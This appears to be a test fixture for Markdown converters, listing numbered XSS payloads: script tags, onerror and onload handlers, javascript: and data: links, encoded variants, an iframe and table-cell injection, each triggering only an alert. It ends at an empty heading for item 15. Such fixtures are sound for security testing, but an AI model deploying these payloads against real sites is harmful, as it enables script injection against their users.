# XSS Payloads for Markdown Testing

This document contains various XSS payloads for testing the security of Markdown converters.

---

## 0. False positive
<img src="script.jpg">

## 1. Script tag

<script>alert('XSS1')</script>

---

## 2. Image tag with onerror

![Test image](x" onerror="alert('XSS2'))

Or raw HTML:

<img src="x" onerror="alert('XSS3')">

---

## 3. Link with javascript:

[Click me](javascript:alert('XSS4'))

---

## 4. Event handler attributes

<a href="#" onclick="alert('XSS5')">Click here</a>

<div onmouseover="alert('XSS6')">Hover over me</div>

---

## 5. Inline style with expression

<div style="width: expression(alert('XSS7'));">Test div</div>

---

## 6. Data URI

[Click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=)

---

## 7. SVG with onload

<svg onload="alert('XSS8')"></svg>

Or embedded in a data URI:

![SVG Image](data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>)

---

## 8. Iframe

<iframe src="javascript:alert('XSS9')"></iframe>

---

## 9. HTML entities encoding

<script>alert&#40;'XSS10'&#41;</script>

<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS11');>

<img src="%6a%61%76%61%73%63%72%69%70%74:alert(1)">


---

## 10. HTML comment breakout

<!--><script>alert('XSS12')</script>

---

## 11. Mixed Markdown and raw HTML

**Bold text** <script>alert('XSS13')</script>

---

## 12. Table with XSS

| Name | Value |
|------|-------|
| <img src=x onerror=alert('XSS14')> | test |

---

## 13. Horizontal rule below script

<script>alert('XSS15')</script>

---

## 14. Inline code

`<script>alert('XSS16')</script>`

---

## 15. Block code fence
